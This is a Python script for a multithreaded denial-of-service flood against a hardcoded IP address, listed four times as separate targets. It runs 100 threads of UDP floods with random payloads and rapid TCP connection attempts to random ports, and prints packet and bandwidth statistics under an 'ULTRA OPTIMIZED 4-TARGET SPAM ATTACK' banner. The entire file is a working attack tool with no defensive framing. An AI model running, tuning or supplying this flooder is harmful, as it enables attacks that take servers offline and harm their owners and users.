import socket
import threading
import time
import random
import queue

# 4 targets
targets = [
    "62.109.121.42",
    "62.109.121.42", 
    "62.109.121.42",
    "62.109.121.42"
]

# Colors
MAGENTA = '\033[95m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'

COLOR_MAP = [YELLOW, CYAN, GREEN, MAGENTA]

# Optimized stats - lock-free atomic updates
class AtomicCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()
    
    def inc(self, amount=1):
        with self.lock:
            self.value += amount
            return self.value
    
    def get(self):
        with self.lock:
            return self.value
    
    def reset(self):
        with self.lock:
            old = self.value
            self.value = 0
            return old

# Stats per target
stats = []
for _ in range(len(targets)):
    stats.append({
        "udp_sent": AtomicCounter(),
        "syn_sent": AtomicCounter(),
        "udp_data": AtomicCounter(),
        "syn_data": AtomicCounter(),
        "udp_success": AtomicCounter(),
        "syn_success": AtomicCounter(),
        "udp_fail": AtomicCounter(),
        "syn_fail": AtomicCounter()
    })

# UDP Attack - OPTIMIZED VERSION
def udp_attack(target_idx):
    target_ip = targets[target_idx]
    stat = stats[target_idx]
    
    # Pre-create payloads to avoid generation overhead
    payload_pool = []
    for _ in range(50):
        size = random.randint(500, 1450)
        payload_pool.append(random.randbytes(size))
    
    # Reuse sockets to avoid creation overhead
    sockets = []
    for _ in range(3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Increase buffer
            sockets.append(sock)
        except:
            pass
    
    if not sockets:
        sockets.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
    
    socket_idx = 0
    
    while True:
        try:
            # Fast payload selection
            payload = random.choice(payload_pool)
            port = random.randint(1, 65535)
            
            # Round-robin socket usage
            sock = sockets[socket_idx % len(sockets)]
            socket_idx += 1
            
            # NO DELAY - FULL SEND
            sock.sendto(payload, (target_ip, port))
            data_sent = len(payload)
            
            # Atomic updates (fast)
            stat["udp_sent"].inc()
            stat["udp_data"].inc(data_sent)
            stat["udp_success"].inc()
            
        except:
            stat["udp_fail"].inc()

# SYN Attack - OPTIMIZED VERSION  
def syn_attack(target_idx):
    target_ip = targets[target_idx]
    stat = stats[target_idx]
    
    # Socket pool for reuse
    sockets = []
    for _ in range(10):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)  # Faster timeout
            sockets.append(sock)
        except:
            pass
    
    socket_idx = 0
    
    while True:
        try:
            # Get socket from pool
            sock = sockets[socket_idx % len(sockets)]
            socket_idx += 1
            
            port = random.randint(1, 65535)
            
            # NO DELAY - FULL SEND
            result = sock.connect_ex((target_ip, port))
            
            stat["syn_sent"].inc()
            stat["syn_data"].inc(64)
            
            if result == 0:
                stat["syn_success"].inc()
                # Close and replace socket
                sock.close()
                sockets[(socket_idx-1) % len(sockets)] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                stat["syn_fail"].inc()
                # Reuse same socket for next attempt
                pass
                
        except:
            stat["syn_fail"].inc()
            try:
                # Replace broken socket
                sock.close()
                sockets[(socket_idx-1) % len(sockets)] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass

# Start optimized threads - MORE THREADS FOR MORE POWER
THREADS_PER_TARGET = 25  # Total threads: 25 * 4 = 100 threads
UDP_THREADS_PER_TARGET = 15  # 15 UDP per target
SYN_THREADS_PER_TARGET = 10  # 10 SYN per target

print(f"{MAGENTA}{'='*60}{RESET}")
print(f"{WHITE}ULTRA OPTIMIZED 4-TARGET SPAM ATTACK{RESET}")
print(f"{WHITE}Targets: {len(targets)}{RESET}")
print(f"{WHITE}Threads per target: {THREADS_PER_TARGET}{RESET}")
print(f"{WHITE}Total threads: {THREADS_PER_TARGET * len(targets)}{RESET}")
print(f"{MAGENTA}{'='*60}{RESET}")

# Start attack threads for each target
for target_idx in range(len(targets)):
    color = COLOR_MAP[target_idx % len(COLOR_MAP)]
    print(f"{color}Starting attack on {targets[target_idx]}...{RESET}")
    
    # UDP threads
    for _ in range(UDP_THREADS_PER_TARGET):
        threading.Thread(target=udp_attack, args=(target_idx,), daemon=True).start()
    
    # SYN threads
    for _ in range(SYN_THREADS_PER_TARGET):
        threading.Thread(target=syn_attack, args=(target_idx,), daemon=True).start()

# Optimized logging
last_time = time.time()
start_time = time.time()

while True:
    time.sleep(0.05)  # Faster polling
    current_time = time.time()
    
    if current_time - last_time >= 5:  # Log every 5 seconds (more frequent)
        print(f"\n{WHITE}{'='*80}{RESET}")
        print(f"{MAGENTA}ULTRA SPAM - {current_time - start_time:.0f}s{RESET}")
        print(f"{WHITE}{'='*80}{RESET}")
        
        total_sent = 0
        total_data = 0
        total_success = 0
        total_fail = 0
        
        # Collect and display per-target stats
        for target_idx in range(len(targets)):
            stat = stats[target_idx]
            color = COLOR_MAP[target_idx % len(COLOR_MAP)]
            
            # Get and reset counters
            udp_sent = stat["udp_sent"].reset()
            syn_sent = stat["syn_sent"].reset()
            udp_data = stat["udp_data"].reset()
            syn_data = stat["syn_data"].reset()
            udp_success = stat["udp_success"].reset()
            syn_success = stat["syn_success"].reset()
            udp_fail = stat["udp_fail"].reset()
            syn_fail = stat["syn_fail"].reset()
            
            # Calculate target totals
            target_sent = udp_sent + syn_sent
            target_data = udp_data + syn_data
            target_success = udp_success + syn_success
            target_fail = udp_fail + syn_fail
            
            # Add to global totals
            total_sent += target_sent
            total_data += target_data
            total_success += target_success
            total_fail += target_fail
            
            # Calculate rates
            data_mb = target_data / (1024 * 1024)
            pps = target_sent / 5  # Per second
            
            # Display target stats
            print(f"{color}╔ {targets[target_idx]}{RESET}")
            print(f"{color}║ Packets: {GREEN}{target_sent:,}{RESET} ({GREEN}{pps:,.0f}/s{RESET})")
            print(f"{color}║ Data: {GREEN}{data_mb:.2f}MB{RESET} ({GREEN}{data_mb/5:.2f}MB/s{RESET})")
            print(f"{color}║ Success: {GREEN}{target_success:,}{RESET} | Fail: {RED}{target_fail:,}{RESET}")
            print(f"{color}║ UDP: {BLUE}{udp_sent:,}{RESET} | SYN: {BLUE}{syn_sent:,}{RESET}")
            print(f"{color}╚{'─'*40}{RESET}")
        
        # Display global totals
        total_data_mb = total_data / (1024 * 1024)
        total_pps = total_sent / 5
        
        print(f"\n{WHITE}{'='*80}{RESET}")
        print(f"{MAGENTA}GLOBAL TOTALS (5s window):{RESET}")
        print(f"{GREEN}Total Packets: {total_sent:,}{RESET} ({GREEN}{total_pps:,.0f}/s{RESET})")
        print(f"{GREEN}Total Data: {total_data_mb:.2f}MB{RESET} ({GREEN}{total_data_mb/5:.2f}MB/s{RESET})")
        print(f"{GREEN}Success Rate: {(total_success/(total_success+total_fail)*100):.1f}%{RESET}")
        print(f"{WHITE}{'='*80}{RESET}")
        
        last_time = current_time
